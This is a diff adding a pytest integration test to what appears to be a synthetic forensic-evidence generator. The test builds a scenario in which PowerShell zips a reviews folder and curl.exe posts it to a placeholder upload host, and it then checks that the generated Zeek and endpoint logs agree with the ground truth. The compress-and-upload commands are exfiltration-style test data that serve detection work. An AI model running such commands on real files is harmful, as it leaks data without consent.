@@ -25,6 +25,88 @@ from evidenceforge.models.scenario import (
     TimeWindow,
     User,
 )
+from tests.integration.test_ground_truth_reconciliation import _scenario
+
+
+@pytest.mark.parametrize("event_type", ["connection", "beacon"])
+def test_command_created_archive_supplies_multipart_size(tmp_path: Path, event_type: str) -> None:
+    archive = r"C:\Temp\board-review.zip"
+    scenario = _scenario(
+        tmp_path,
+        [
+            {
+                "type": "process",
+                "process_name": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                "command_line": f'powershell.exe -Command "Compress-Archive -Path C:\\Reviews -DestinationPath {archive} -Force"',
+            }
+        ],
+        formats=["ecar", "zeek"],
+    )
+    scenario.time_window.duration = "3m"
+    upload: dict = {
+        "type": event_type,
+        "dst_ip": "198.51.100.92",
+        "dst_port": 80,
+        "hostname": "upload.workspace-sync.example",
+        "service": "http",
+        "method": "POST",
+        "uri": "/api/objects",
+        "status_code": 201,
+        "request_multipart": {
+            "parts": [
+                {
+                    "name": "file",
+                    "local_source_path": archive,
+                    "filename": "board-review.zip",
+                    "content_type": "application/zip",
+                }
+            ]
+        },
+    }
+    if event_type == "beacon":
+        upload.update(interval="5s", count=1)
+    scenario.storyline.append(
+        StorylineEvent(
+            id="upload-archive",
+            time="+90s",
+            actor="alice",
+            system="WS01",
+            activity="Upload the archive created by the earlier command",
+            events=[
+                {
+                    "type": "process",
+                    "process_name": r"C:\Windows\System32\curl.exe",
+                    "command_line": f'curl.exe -F "file=@{archive};type=application/zip" http://upload.workspace-sync.example/api/objects',
+                },
+                upload,
+            ],
+        )
+    )
+    GenerationEngine(scenario, tmp_path).generate()
+    http_row = next(
+        row
+        for row in _read_ndjson(tmp_path, "http.json")
+        if row.get("host") == "upload.workspace-sync.example" and row["request_body_len"] > 0
+    )
+    file_row = next(
+        row for row in _read_ndjson(tmp_path, "files.json") if row["fuid"] in http_row["orig_fuids"]
+    )
+    assert 0 < file_row["seen_bytes"] < http_row["request_body_len"]
+    if event_type == "connection":
+        truth = json.loads((tmp_path / "GROUND_TRUTH.json").read_text())
+        multipart = next(
+            event["attributes"]["http_multipart"]["request"]
+            for event in truth["events"]
+            if event.get("attributes", {}).get("http_multipart")
+        )
+        assert http_row["request_body_len"] == multipart["body_len"]
+        assert file_row["seen_bytes"] == multipart["parts"][0]["decoded_size"]
+    endpoint_files = [
+        row
+        for row in _read_ndjson(tmp_path, "ecar.json")
+        if row.get("object") == "FILE" and row.get("properties", {}).get("file_path") == archive
+    ]
+    assert {row["action"] for row in endpoint_files} >= {"CREATE", "READ"}
 
 
 def _read_ndjson(root: Path, filename: str) -> list[dict]:
